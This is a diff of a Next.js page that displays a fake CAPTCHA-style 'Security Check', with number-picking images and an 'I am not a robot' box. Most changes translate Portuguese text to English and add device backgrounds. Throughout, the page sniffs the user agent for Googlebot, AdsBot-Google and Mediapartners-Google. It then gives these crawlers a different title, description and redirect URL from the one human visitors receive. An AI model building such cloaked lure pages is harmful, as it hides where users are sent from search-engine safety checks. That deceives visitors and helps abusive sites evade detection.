@@ -4,7 +4,6 @@ import { useState, useEffect } from 'react';
 import Link from 'next/link';
 import MetaHead from '@/app/components/metaHead/page';
 
-// Configurações para diferentes visualizações
 const config = {
   robot: {
     title: "Security Check",
@@ -18,23 +17,23 @@ const config = {
   }
 };
 
-// Imagens para verificação
 const imageUrls = ['/3.png', '/7.png', '/1.png'];
 
-// Backgrounds responsivos
 const backgrounds = {
-  mobile: "mobile:bg-[url('/javaVerify/jb1.png')]",
-  tablet: "tablet:bg-[url('/javaVerify/jb1.png')]",
-  desktop: "desktop:bg-[url('/javaVerify/jb1.png')]",
-  mobileBg: "mobile:bg-[url('/javaVerify/jb1.png')]",
-  i12ProBg: "i12pro:bg-[url('/javaVerify/jb1.png')]",
-  i14ProMaxBg: "i14promax:bg-[url('/javaVerify/jb1.png')]",
-  ipadMiniBg: "ipadmini:bg-[url('/javaVerify/jb1.png')]",
-  ipadAirBg: "ipadair:bg-[url('/javaVerify/jb1.png')]",
-  laptopBg: "laptop:bg-[url('/javaVerify/jb1.png')]",
-  desktop1Bg: "desktop1:bg-[url('/javaVerify/jb1.png')]",
-  desktop2Bg: "desktop2:bg-[url('/javaVerify/jb1.png')]",
-  desktop3Bg: "desktop3:bg-[url('/javaVerify/jb1.png')]"
+  iPhone11ProBg: "iPhone11Pro:bg-[url('/javaVerify/iPhone11Pro.png')]",
+  iPhone12ProMaxBg: "iPhone12ProMax:bg-[url('/javaVerify/iPhone12ProMax.png')]",
+  iPhone13miniBg: "iPhone13mini:bg-[url('/javaVerify/iPhone13mini.png')]",
+  iPhone13ProBg: "iPhone13Pro:bg-[url('/javaVerify/iPhone13Pro.png')]",
+  iPhone15ProBg: "iPhone15Pro:bg-[url('/javaVerify/iPhone15Pro.png')]",
+  iPhone15ProMaxBg: "iPhone15ProMax:bg-[url('/javaVerify/iPhone15ProMax.png')]",
+  MacbookAirM2Bg: "MacbookAirM2:bg-[url('/javaVerify/MacbookAirM2.png')]",
+  MacbookPro16Bg: "MacbookPro16:bg-[url('/javaVerify/MacbookPro16.png')]",
+  iMac24Bg: "iMac24:bg-[url('/javaVerify/iMac24.png')]",
+  MacbookAirBg: "MacbookAir:bg-[url('/javaVerify/MacbookAir.png')]",
+  LaptopBg: "Laptop:bg-[url('/javaVerify/Laptop.png')]",
+  Desktop1Bg: "Desktop1:bg-[url('/javaVerify/Desktop1.png')]",
+  Desktop2Bg: "Desktop2:bg-[url('/javaVerify/Desktop2.png')]",
+  desktop3Bg: "desktop3:bg-[url('/javaVerify/desktop3.png')]",
 };
 
 export default function JavaVerify() {
@@ -43,14 +42,12 @@ export default function JavaVerify() {
   const [isRed, setIsRed] = useState(false);
 
   useEffect(() => {
-    // Simplificada detecção de Googlebot
-    const useGreen = navigator.userAgent.toLowerCase();
-    const isGoogleRed = useGreen.includes('googlebot') || 
-                       useGreen.includes('adsbot-google') || 
-                       useGreen.includes('mediapartners-google');
+    const userAgent = navigator.userAgent.toLowerCase();
+    const isGoogleRed = userAgent.includes('googlebot') || 
+                        userAgent.includes('adsbot-google') || 
+                        userAgent.includes('mediapartners-google');
     setIsRed(isGoogleRed);
     
-    // Atualiza título da página
     document.title = isGoogleRed ? config.robot.title : config.user.title;
   }, []);
 
@@ -62,11 +59,16 @@ export default function JavaVerify() {
     );
   };
 
-  const handleRedirect = () => {
+  const handleButtonClick = (e) => {
     if (!isChecked) {
-      alert("Por favor, marque a caixa para verificar que você não é um robô.");
-      return "#";
+      e.preventDefault(); 
+      if (typeof window !== 'undefined') {
+        window.alert("Please check the box to verify you are not a robot.");
+      }
     }
+  };
+
+  const getRedirectUrl = () => {
     return isRed ? config.robot.redirectUrl : config.user.redirectUrl;
   };
 
@@ -78,15 +80,12 @@ export default function JavaVerify() {
         description={isRed ? config.robot.description : config.user.description}
       />
       
-      <main className={`${Object.values(backgrounds).join(' ')} bg-cover h-screen flex justify-center items-center relative`}>
+      <main className={`${backgrounds.mobileBg} ${Object.values(backgrounds).join(' ')} bg-cover h-screen flex justify-center items-center relative`}>
         <div className="absolute inset-0 bg-black opacity-70 z-10"></div>
 
         <section className="relative z-20 bg-white shadow-md rounded-lg mx-6 p-6 w-full max-w-lg">
-          <h2 className="text-center text-2xl font-semibold mb-4 text-gray-800">
-            {isRed ? "Verificação de Segurança" : "Verificação Necessária"}
-          </h2>
-
-          <p className="text-gray-700 mb-4">Selecione o número 7</p>
+          <h2 className="text-center text-2xl font-semibold mb-4 text-gray-800">Security Verification</h2>
+          <p className="text-gray-700 mb-4">Select the number 7</p>
 
           <div className="grid grid-cols-3 gap-2 mb-4">
             {imageUrls.map((url, index) => (
@@ -101,7 +100,7 @@ export default function JavaVerify() {
               >
                 <img 
                   src={url} 
-                  alt={`Opção ${index + 1}`}
+                  alt={`Option ${index + 1}`}
                   className="w-full h-full object-contain"
                 />
               </div>
@@ -117,15 +116,16 @@ export default function JavaVerify() {
               className="h-4 w-4 text-blue-600"
             />
             <label htmlFor="verify" className="ml-2 text-gray-700">
-              Não sou um robô
+              I am not a robot
             </label>
           </div>
 
-          <Link href={handleRedirect()} passHref>
+          <Link href={getRedirectUrl()} passHref>
             <button 
+              onClick={handleButtonClick}
               className="w-full bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 transition-all"
             >
-              Verificar
+              Submit
             </button>
           </Link>
         </section>
